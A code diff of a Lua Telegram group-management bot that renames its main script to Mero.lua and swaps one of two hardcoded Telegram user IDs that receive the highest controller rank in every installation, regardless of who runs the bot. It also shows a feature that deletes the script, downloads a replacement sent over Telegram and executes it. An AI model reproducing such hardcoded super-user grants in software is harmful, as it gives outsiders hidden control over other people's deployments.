@@ -28,7 +28,7 @@ end
 else
 print('\27[1;34mلم يتم حفظ التوكن جرب مره اخرى \nToken not saved, try again')
 end 
-os.execute('lua5.3 bots.lua')
+os.execute('lua5.3 Mero.lua')
 end
 if not Redis:get(SshId.."Info:Redis:User") then
 io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
@@ -39,7 +39,7 @@ Redis:set(SshId.."Info:Redis:User",UserSudo)
 else
 print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
 end 
-os.execute('lua5.3 bots.lua')
+os.execute('lua5.3 Mero.lua')
 end
 if not Redis:get(SshId.."Info:Redis:User:ID") then
 io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
@@ -50,7 +50,7 @@ Redis:set(SshId.."Info:Redis:User:ID",UserId)
 else
 print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
 end 
-os.execute('lua5.3 bots.lua')
+os.execute('lua5.3 Mero.lua')
 end
 local Informationlua = io.open("Information.lua", 'w')
 Informationlua:write([[
@@ -92,7 +92,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos = {Sudo_Id,1984103105,1783964439}
+local ListSudos = {Sudo_Id,1984103105,1224024534}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -115,7 +115,7 @@ function Controllerbanall(ChatId,UserId)
 Status = 0
 local Controll2 = Redis:sismember(TheMero.."Mero:ControlAll:Groups",UserId)
 DevelopersQ = Redis:sismember(TheMero.."Mero:DevelopersQ:Groups",UserId) 
-if UserId == 1783964439 then
+if UserId == 1224024534 then
 Status = true
 elseif UserId == 1984103105 then
 Status = true
@@ -150,7 +150,7 @@ Addictive = Redis:sismember(TheMero.."Mero:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheMero.."Mero:Distinguished:Group"..ChatId,UserId)
 MalekAsase = Redis:sismember(TheMero.."Mero:MalekAsase:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1783964439 then
+if UserId == 1224024534 then
 Status = 'AHMED 🎖️'
 elseif UserId == 1984103105 then
 Status = 'Mais 🫅'
@@ -1020,7 +1020,7 @@ Addictive = Redis:sismember(TheMero.."Mero:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheMero.."Mero:Distinguished:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.luatele
 MalekAsase = Redis:sismember(TheMero.."Mero:MalekAsase:Group"..ChatId,UserId)
-if UserId == 1783964439 then
+if UserId == 1224024534 then
 Status = true
 elseif UserId == 1984103105 then
 Status = true
@@ -1066,7 +1066,7 @@ Addictive = Redis:sismember(TheMero.."Mero:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheMero.."Mero:Distinguished:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.luatele
 MalekAsase = Redis:sismember(TheMero.."Mero:MalekAsase:Group"..ChatId,UserId)
-if UserId == 1783964439 then
+if UserId == 1224024534 then
 Status = true
 elseif UserId == 1984103105 then
 Status = true
@@ -1110,7 +1110,7 @@ Addictive = Redis:sismember(TheMero.."Mero:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheMero.."Mero:Distinguished:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.luatele
 MalekAsase = Redis:sismember(TheMero.."Mero:MalekAsase:Group"..ChatId,UserId)
-if UserId == 1783964439 then
+if UserId == 1224024534 then
 Status = true
 elseif UserId == 1984103105 then
 Status = true
@@ -1345,7 +1345,7 @@ end
 end
 return false
 end
-if tonumber(msg.sender_id.user_id) == 1783964439 then
+if tonumber(msg.sender_id.user_id) == 1224024534 then
 msg.Name_Controller = 'AHMED 🎖️'
 msg.The_Controller = 1
 elseif tonumber(msg.sender_id.user_id) == 1984103105 then
@@ -1735,7 +1735,7 @@ end
 print('This is reply_markup')
 end 
 local UserInfo = bot.getUser(msg.sender_id.user_id)
-if msg.sender_id.user_id ~= 1783964439 then 
+if msg.sender_id.user_id ~= 1224024534 then 
 local names = (UserInfo.first_name or '...')..(UserInfo.last_name or '...')
 if names and  names:find("اۏنـــ͜ާﻶﯾڼ") then
 bot.deleteMessages(msg.chat_id,{[1]= msg.id})
@@ -4200,7 +4200,7 @@ SudoId = ]]..UserId_Info.id..[[
 ]])
 Informationlua:close()
 send(msg_chat_id,msg_id,"\n⇜ تم تغيير المطور الاساسي اصبح : [@"..text:gsub('@','').."]","md",true)  
-dofile('bots.lua')  
+dofile('Mero.lua')  
 return false
 end
 end
@@ -4291,10 +4291,10 @@ local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 if Message_Reply.content.document then
 local File_Id = Message_Reply.content.document.document.remote.id
 local Name_File = Message_Reply.content.document.file_name
-if Name_File ~= 'bots.lua' then
+if Name_File ~= 'Mero.lua' then
 return bot.sendText(msg_chat_id,msg_id,'• عذرا هذا الملف ليس سورسك')
 end 
-os.execute('rm -rf bots.lua')
+os.execute('rm -rf Mero.lua')
 local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
 local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
 return bot.sendText(msg_chat_id,msg_id,'• تم رفع سورس اكتب تحديث')
@@ -19482,7 +19482,7 @@ end
 print('Chat Id : '..msg_chat_id)
 print('User Id : '..msg_user_send_id)
 send(msg_chat_id,msg_id, "⇜  تم تحديث الملفات ","md",true)
-dofile('bots.lua')  
+dofile('Mero.lua')  
 end
 if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
 if not msg.ControllerBot then 
@@ -22150,7 +22150,7 @@ end
 print('Chat Id : '..msg_chat_id)
 print('User Id : '..msg_user_send_id)
 send(msg_chat_id,msg_id, "⇜  تم تحديث الملفات","md",true)
-dofile('bots.lua')  
+dofile('Mero.lua')  
 end
 
 if text and text:match("/start hms(.*)from_id(%d+)") then
@@ -22733,7 +22733,7 @@ end
 Redis:set(TheMero..'rmzsource',text)
 Redis:del(TheMero.."set:rmz"..msg.sender_id.user_id)
 send(msg_chat_id,msg_id,'⇜ تم حفظ رمز السورس ',"md",true)  
-dofile('bots.lua')  
+dofile('Mero.lua')  
 end
 end
 if text == "تعيين رمز السورس" then 
